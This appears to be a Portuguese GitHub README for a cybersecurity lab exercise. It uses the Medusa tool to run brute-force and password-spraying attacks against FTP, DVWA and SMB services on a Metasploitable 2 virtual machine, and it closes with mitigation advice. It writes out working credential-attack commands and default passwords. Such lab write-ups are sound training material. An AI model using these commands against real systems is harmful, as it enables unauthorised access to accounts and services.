# 🛡️ Simulação de Ataques de Força Bruta e Password Spraying com Medusa

![Kali Linux](https://img.shields.io/badge/Kali_Linux-268BEE?style=for-the-badge&logo=kalilinux&logoColor=white)
![Security](https://img.shields.io/badge/Cybersecurity-Pentest-red?style=for-the-badge)
![VirtualBox](https://img.shields.io/badge/VirtualBox-183A61?style=for-the-badge&logo=virtualbox&logoColor=white)

> **⚠️ Aviso Legal:** Este projeto foi desenvolvido estritamente para fins educacionais e de pesquisa em segurança cibernética, executado em um ambiente de laboratório totalmente isolado. Nunca utilize essas técnicas ou ferramentas contra sistemas sem autorização explícita.

---

## 📋 Sobre o Projeto

Este repositório documenta a implementação prática de testes de invasão (*Pentest*) focados na validação de mecanismos de autenticação. Utilizando o **Kali Linux** e a ferramenta **Medusa**, foram simulados cenários reais de **Força Bruta** (*Brute Force*) e **Password Spraying** contra serviços vulneráveis hospedados no **Metasploitable 2** (FTP, HTTP/DVWA e SMB), culminando em um guia técnico de mitigação e defesa.

### 🎯 Objetivos
- Configurar um ambiente de laboratório seguro e isolado em rede interna (*Host-Only*).
- Executar ataques automatizados de quebra de credenciais em diferentes protocolos.
- Validar acessos obtidos e compreender o impacto de credenciais fracas ou padrão.
- Propor contramedidas eficazes de *hardening* e monitoramento.

---

## 🏗️ Arquitetura do Ambiente

O laboratório foi estruturado no **Oracle VM VirtualBox** utilizando uma rede privada (*Host-Only*) na faixa `192.168.56.0/24` para garantir isolamento total da rede externa.

| Máquina Virtual | Sistema Operacional | Endereço IP | Função no Laboratório |
| :--- | :--- | :--- | :--- |
| **Atacante** | Kali Linux | `192.168.56.102` | Execução de enumeração, wordlists e disparos com Medusa |
| **Alvo** | Metasploitable 2 | `192.168.56.101` | Hospedagem dos serviços vulneráveis (`vsftpd`, `DVWA`, `Samba`) |

---

## 📂 Estrutura Sugerida do Repositório

```text
├── wordlists/
│   ├── users.txt          # Lista de usuários comuns para enumeração/spraying
│   └── passwords.txt      # Lista de senhas fracas e padrões de fábrica
├── docs/
│   └── relatorio_tecnico.md
└── README.md
```

### Exemplos de Wordlists Utilizadas
* **`users.txt`**: `root`, `msfadmin`, `admin`, `user`, `service`
* **`passwords.txt`**: `123456`, `password`, `msfadmin`, `admin123`, `password123`

---

## 🚀 Execução dos Testes Práticos

### Referência Rápida do Medusa
* `-h`: IP do alvo
* `-u` / `-U`: Usuário único / Arquivo com lista de usuários
* `-p` / `-P`: Senha única / Arquivo com lista de senhas
* `-M`: Módulo do serviço alvo (`ftp`, `http`, `smbnt`)
* `-m`: Parâmetros específicos do módulo

---

### 1️⃣ Ataque de Força Bruta em FTP
Teste de credenciais contra o serviço `vsftpd` operando na porta `21`.

**Comando:**
```bash
medusa -h 192.168.56.101 -u msfadmin -P wordlists/passwords.txt -M ftp
```

**Validação de Acesso:**
Após o Medusa identificar a combinação `msfadmin:msfadmin`, o acesso foi confirmado via cliente FTP:
```bash
ftp 192.168.56.101
# Login bem-sucedido: 230 Login successful.
```

---

### 2️⃣ Automação em Formulário Web (DVWA)
Simulação de submissão automatizada contra o módulo *Brute Force* do *Damn Vulnerable Web Application*.

**Comando:**
```bash
medusa -h 192.168.56.101 -u admin -P wordlists/passwords.txt -M http -m URL:/dvwa/vulnerabilities/brute/
```

**Validação de Acesso:**
Identificação das credenciais `admin:password` por meio da análise das respostas HTTP, validada posteriormente via autenticação direta no painel web (`http://192.168.56.101/dvwa/login.php`).

---

### 3️⃣ Password Spraying em SMB com Enumeração de Usuários
Diferente da força bruta tradicional, o *Password Spraying* testa uma única senha comum contra múltiplos usuários para evitar o bloqueio de contas por excesso de tentativas.

**Comando:**
```bash
medusa -h 192.168.56.101 -U wordlists/users.txt -p password123 -M smbnt
```

**Validação de Acesso:**
Após detectar uma conta vulnerável (ex: `user:password123`), o acesso ao compartilhamento foi confirmado via `smbclient`:
```bash
smbclient //192.168.56.101/tmp -U user%password123
```

---

## 🛡️ Recomendações de Mitigação e Defesa

Para mitigar os vetores explorados neste projeto, recomenda-se a aplicação das seguintes camadas de segurança:

1. **Políticas de Senhas e MFA:**
   - Exigir senhas complexas (mínimo de 12–14 caracteres) e abolir credenciais padrão.
   - Implementar **Autenticação Multi-Fator (MFA)** em todos os serviços críticos.
2. **Controle de Tentativas (*Rate Limiting* e *Account Lockout*):**
   - Limitar requisições de login por endereço IP em janelas curtas de tempo.
   - Utilizar **CAPTCHA** em formulários web para bloquear automações.
3. **Hardening de Protocolos:**
   - Substituir serviços legados sem criptografia (como FTP) por **SFTP** ou **SCP**.
   - Restringir o acesso à porta SMB (`445/139`) apenas a redes internas confiáveis e desativar o SMBv1.
4. **Monitoramento Ativo (IDS/IPS):**
   - Configurar ferramentas como **Fail2ban** para banir automaticamente IPs que gerem falhas repetidas nos logs de autenticação.
   - Criar alertas no **SIEM** para detectar padrões transversais de tentativas de login característicos de *Password Spraying*.

---

## 👨‍💻 Autor

Desenvolvido como parte de desafio prático em Cibersegurança e Testes de Intrusão.